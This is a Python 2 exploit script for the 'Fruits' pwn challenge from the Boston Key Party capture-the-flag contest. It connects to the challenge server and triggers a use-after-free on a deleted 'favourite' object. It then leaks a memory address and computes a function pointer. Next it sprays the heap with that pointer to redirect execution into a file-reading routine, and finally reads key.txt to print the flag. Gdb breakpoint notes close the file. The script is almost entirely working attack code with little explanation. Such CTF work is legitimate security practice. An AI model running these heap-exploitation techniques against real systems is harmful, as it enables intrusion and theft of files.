__author__ = 'HuyNA'
"""
Fruits
Pwning : 100

Just Pwn it 54.218.22.41:37717

http://bostonkeyparty.net/challenges/fruits-b43fce47212336d695d97c690a9ab16f
"""
import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "54.218.22.41"
local_host="192.168.248.156"
port = 37717
s.connect((host, port))
#s.connect((local_host, port))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf


#sys.stdin.read(1)
#print "press enter to continue ... "
print "================ PHASE 1 - LEAK MEM ================"

print "[+] create apple object ... "
print recv_until(s, "Choose an option:")
send_data = "6\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "your cart?:")
send_data = "0\n"
s.send(send_data)
time.sleep(0.01)

print "[+] create pear object ... "
print recv_until(s, "Choose an option:")
send_data = "6\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "your cart?:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

print "[+] set pear object to favourite ... "
print recv_until(s, "Choose an option:")
send_data = "9\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "favorite item:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

print "[+] delete pear object (favourite) ... "
print recv_until(s, "Choose an option:")
send_data = "8\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "to delete:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

print "[+] Overwrite deleted object ... "
data3 = "1111111111111111\n"
print recv_until(s, "Choose an option:")
send_data = "2\n"
s.send(send_data)
time.sleep(0.01)
s.send(data3)
time.sleep(0.01)

print "[+] change fav  ... "
print recv_until(s, "Choose an option:")
send_data = "10\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "add to your cart?:")
send_data = "0\n"       # APPLE OBJECT
s.send(send_data)
time.sleep(0.01)

print "[+] leak mem by List Note  ... "
print recv_until(s, "Choose an option:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)
data = recv_until(s, "----------------------------------------")

for i in range(18, len(data)):
    if data[i] == '\x0a':
        break
data = data[18:i]
data += "\x00"*(8-len(data))
delta = 0x23F0
print data.encode("hex")
address = struct.unpack("<Q", data)[0]
print hex(address)
address1 = address - delta
print hex(address1)
read_file_address = address1 + 0x203CC0

read_file_address_string = struct.pack("<Q", read_file_address)
print read_file_address_string.encode("hex")
#0000000000001A90     a_read_note_from_file_4 proc near
"""
0x96294143f0L
0x8349c343f0L
"""

print "================ PHASE 2 - SPRAY  ========================================================================="

print "[+] create pear object ... "
print recv_until(s, "Choose an option:")
send_data = "6\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "your cart?:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

print "[+] set last object to favourite ... "
print recv_until(s, "Choose an option:")
send_data = "9\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "favorite item:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

print "[+] delete last object (favourite) ... "
print recv_until(s, "Choose an option:")
send_data = "8\n"
s.send(send_data)
time.sleep(0.01)
print recv_until(s, "to delete:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)

data1 = read_file_address_string*6+'\n'
data2 = read_file_address_string*2+'\n'

print "[+] spray heap ... "
for i in xrange(10):
    print recv_until(s, "Choose an option:")
    send_data = "2\n"
    s.send(send_data)
    time.sleep(0.01)
    s.send(data2)
    time.sleep(0.01)

for i in xrange(5):
    print recv_until(s, "Choose an option:")
    send_data = "2\n"
    s.send(send_data)
    time.sleep(0.01)
    s.send(data1)
    time.sleep(0.01)




print "[+] call to read file function  ... "
print recv_until(s, "Choose an option:")
send_data = "11\n"
s.send(send_data)
time.sleep(0.01)

file_name = "key.txt\n"
s.send(file_name)
time.sleep(0.01)

print "[+] Final view flag  ... "
print recv_until(s, "Choose an option:")
send_data = "1\n"
s.send(send_data)
time.sleep(0.01)


print recv_until(s, "----------------------------------------")



"""

b *(0x01950+0x555555554000)
b *(0x002268+0x555555554000)
b *(0x1BBA+0x555555554000)


0x203CC0+0x555555554000=0x555555757CC0
"""